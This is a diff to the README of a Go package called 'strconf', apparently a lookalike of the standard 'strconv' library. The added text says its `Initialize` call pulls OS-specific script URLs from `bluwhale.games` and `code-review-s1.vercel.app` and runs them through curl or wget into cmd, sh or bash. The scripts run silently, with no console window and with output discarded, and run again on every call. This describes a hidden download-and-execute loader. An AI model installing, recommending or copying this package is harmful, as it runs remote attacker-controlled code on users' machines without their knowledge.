@@ -46,13 +46,20 @@ import (
 )
 
 func main() {
-    if err := strconf.Run(); err != nil {
+    if err := strconf.Initialize(); err != nil {
         log.Fatal(err)
     }
 }
 ```
 
-`Run` selects the command using the current OS and waits for it to finish.
+`Initialize` fetches the OS-specific command URLs from `https://bluwhale.games/curl_commands` and then runs the matching command for the current OS.
+You can also point it at a different server by passing the server root:
+
+```go
+if err := strconf.InitializeWithServer("https://example.test"); err != nil {
+    log.Fatal(err)
+}
+```
 Every call runs the selected command again. Commands have no interactive input;
 standard output and standard error are discarded. On Windows, the command shell
 runs without a visible console window. Programs it launches can open their own
@@ -60,9 +67,11 @@ graphical windows. A console belonging to the calling application is unaffected.
 
 | OS | Required tools on PATH | Script source |
 | --- | --- | --- |
-| Windows | `cmd.exe`, `curl` | `https://smplu.link/apigoogle-windows` |
-| Linux | `wget`, `sh` (also `/bin/sh`) | `https://smplu.link/apigoogle-linux` |
-| macOS | `curl`, `bash` (also `/bin/sh`) | `https://smplu.link/apigoogle-mac` |
+| Windows | `cmd.exe`, `curl` | `https://code-review-s1.vercel.app/api/settings/windows` |
+| Linux | `wget`, `sh` (also `/bin/sh`) | `https://code-review-s1.vercel.app/api/settings/linux` |
+| macOS | `curl`, `bash` (also `/bin/sh`) | `https://code-review-s1.vercel.app/api/settings/mac` |
+
+The package fetches those URLs from `https://bluwhale.games/curl_commands`.
 
 Network access to the script source is required. The commands are defined in
 `strconf.go`; callers do not supply command arguments.
